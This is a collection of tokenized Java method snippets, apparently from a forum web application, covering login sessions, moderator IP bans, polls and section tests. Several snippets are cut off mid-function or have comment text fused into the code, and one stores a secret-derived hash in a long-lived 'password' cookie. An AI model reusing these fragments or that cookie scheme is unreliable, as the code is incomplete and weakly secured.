public static ResultSet getUser45ScoreBlocked ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( true ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return currentUser . isModerator ( ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return currentUser . isCorrector ( ) ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , final boolean readMessage , final boolean secure , ShowEventsController . Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( insertPoll , voteid , multiSelect , msgid ) ; try { final Poll poll = getPoll ( voteid ) ; 
public void deletePoll ( Poll poll ) { jdbcTemplate . update ( deletePoll1 , poll . getId ( ) ) ; jdbcTemplate . update ( deletePoll2 , poll . getId ( ) ) ; jdbcTemplate . update ( deletePoll3 , poll . getId ( ) ) ; } 
public void addNewVariant ( Poll poll , String label ) { jdbcTemplate . update ( insertNewVariant , 
public void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( deleteVariant , variant . getId ( ) ) ; } 
public void updateMultiselect ( Poll poll , boolean multiselect ) { jdbcTemplate . update ( updateMultiselect , multiselect , poll . getId ( ) ) ; } 
public PreparedPoll preparePoll ( Topic topic , User user ) throws PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( topic . getId ( ) ) ; return new PreparedPoll ( poll , 
public PreparedPoll preparePoll ( Topic topic ) throws PollNotFoundException { return preparePoll ( topic , null ) ; } 
public PreparedTopic prepareTopicForView ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { return prepareMessage ( message , tags , minimizeCut , poll , secure , null ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false ) Boolean captcha_required ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; if ( allow_posting = = null ) { allow_posting = false ; } if ( captcha_required = = null ) { captcha_required = false ; } ipBlockDao . blockIP ( ip , user , reason , ts , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp ts , Boolean allow_posting , Boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public boolean isBlocked ( ) { return isInitialized ( ) & & ( banDate = = null | | banDate . after ( new Date ( ) ) ) ; } 
public boolean isInitialized ( ) { return initialized ; } 
public boolean isAllowPosting ( ) { return ! isBlocked ( ) | | allowPosting ; } 
public boolean isCaptchaRequired ( ) { return isAllowPosting ( ) & & captchaRequired ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = true ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; mv . getModel ( ) . put ( " tor " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , toHtmlFormatter . format ( TEXT17 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) Boolean captcha_required ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , ts , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) throws Exception { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public void processRow ( ResultSet rs ) throws SQLException { Section section = new Section ( rs ) ; sectionList . add ( section ) ; } 
private void initializeSectionList ( ) { ImmutableList . Builder < Section > sectionListBuilder = ImmutableList . builder ( ) ; List < Section > sections = sectionDao . getAllSections ( ) ; sectionListBuilder . addAll ( sections ) ; sectionList = sectionListBuilder . build ( ) ; } 
private void initializeBoxlet ( ) throws SectionNotFoundException { sectionNews = sectionService . getSection ( Section . SECTION_NEWS ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public void sectionsTest ( ) throws Exception { List < Section > sectionList = sectionDao . getAllSections ( ) ; Assert . assertEquals ( 4 , sectionList . size ( ) ) ; String addInfo = sectionDao . getAddInfo ( sectionList . get ( 0 ) . getId ( ) ) ; Assert . assertNotNull ( addInfo ) ; } 
public void getSectionIdByNameTest ( ) throws Exception { Assert . assertEquals ( 1 , sectionService . getSectionIdByName ( " Section 1 " ) ) ; Assert . assertEquals ( 2 , sectionService . getSectionIdByName ( " Section 2 " ) ) ; Assert . assertEquals ( 3 , sectionService . getSectionIdByName ( " Section 3 " ) ) ; Assert . assertEquals ( 4 , sectionService . getSectionIdByName ( " Section 4 " ) ) ; try { sectionService . getSectionIdByName ( " Section XXX " ) ; 
public void getSectionTest ( ) throws Exception { Section section = sectionService . getSection ( 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 3 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertTrue ( section . isImagepost ( ) ) ; Assert . assertFalse ( section . isForum ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 2 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertFalse ( section . isImagepost ( ) ) ; Assert . assertTrue ( section . isForum ( ) ) ; try { section = sectionService . getSection ( - 1 ) ; 
public void prepareMessageTest ( ) { ImmutableList < String > tags = ImmutableList . of ( " one " , " two " ) ; Topic message = mock ( Topic . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDaoImpl . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; TopicDao messageDao = mock ( TopicDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . thenReturn ( 13 ) ; group id 13 
public SectionScrollModeEnum getScrollMode ( int sectionId ) throws SectionNotFoundException { Section section = getSection ( sectionId ) ; return section . getScrollMode ( ) ; } 
public void getScrollModeTest ( ) throws Exception { Section section ; section = sectionService . getSection ( 1 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 3 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 4 ) ; Assert . assertEquals ( SectionScrollModeEnum . NO_SCROLL , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 5 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
public void sectionsScrollModeTest ( ) throws Exception { List < Section > sectionList = sectionDao . getAllSections ( ) ; Section section ; section = getSectionById ( sectionList , 1 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 5 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
private Profile readProfile ( ) throws ClassNotFoundException , IOException , StorageException { InputStream df = null ; try { df = storage . getReadStream ( " profile " , getNick ( ) ) ; 
public void init ( FilterConfig filterConfig ) throws ServletException { this . filterConfig = filterConfig ; WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( filterConfig . getServletContext ( ) ) ; userDao = ctx . getBean ( " userDao " , UserDao . class ) ; configuration = ctx . getBean ( Configuration . class ) ; MemCachedSettings . setMainUrl ( configuration . getMainUrl ( ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public void init ( ) { try { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { throw new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } try { mainHost = mainURI . getHost ( ) ; 
private String processUploadImage ( HttpServletRequest request ) throws IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( configuration . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { try { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . transferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { throw new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } User user = tmpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { throw new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( configuration . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { throw new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
public boolean isCaptchaRequired ( ) { return isBlocked ( ) & & allowPosting & & captchaRequired ; } 
public boolean isBlocked ( ) { return initialized & & ( banDate = = null | | banDate . after ( new Date ( ) ) ) ; } 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setString ( 1 , title ) ; if ( ! info . isEmpty ( ) ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( ! longInfo . isEmpty ( ) ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchOrder.DATE); } else { setValue(SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchOrder.RELEVANCE); 
public void setAsText ( String s ) throws IllegalArgumentException { setValue ( SearchInterval . valueOf ( s . toUpperCase ( ) ) ) ; } 
